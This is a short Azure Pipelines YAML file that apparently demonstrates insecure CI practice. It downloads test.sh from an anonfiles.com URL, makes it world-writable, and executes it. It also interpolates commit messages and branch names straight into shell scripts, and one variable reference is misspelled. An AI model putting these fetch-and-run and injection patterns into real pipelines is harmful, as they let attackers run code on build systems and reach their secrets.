pr:
- main

variables:
- name: varificationUrl # This variable is just an example of a trusted variable that can be compromised
  value: "https://cdn-114.anonfiles.com/z2u7T06fy2/15beaa1c-1662481045"
- name: sourceBranch
  value: $(Build.SourceBranchName)
- name: commitMessage
  value: $(Build.SourceVersionMessage)
  

steps:
  - script: |
      echo "Url to verify: ${{ variables.verifiacationUrl }}"
      echo "verifying the following branch: ${{ variables.sourceBranch }}"
      echo "verifying the commit: ${{ variables.commitMessage }}"
    displayName: Display data
  - script: |
      echo "Url to verify: ${{ variables.varificationUrl }}"
      curl ${{ variables.varificationUrl }}/test.sh --output test.sh
      chmod 777 test.sh
    displayName: Download script
  - bash: "./test.sh"
  - script: |
      ls -la

  
